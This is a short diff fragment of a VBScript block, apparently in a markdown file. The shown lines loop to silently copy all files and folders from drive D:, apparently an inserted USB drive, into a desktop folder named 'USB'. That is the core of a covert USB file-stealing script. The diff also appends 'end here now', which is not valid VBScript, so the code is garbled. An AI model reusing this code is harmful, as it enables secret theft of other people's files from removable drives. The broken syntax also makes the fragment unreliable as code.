@@ -55,6 +55,7 @@ fso.copyfile "d:\*","C:\Users\IVSOUL\Desktop\USB"
 fso.copyfolder "d:\*","C:\Users\IVSOUL\Desktop\USB"
 wscript.sleep 20000
 end if
-loop 
+loop
+end here now
 ```
 
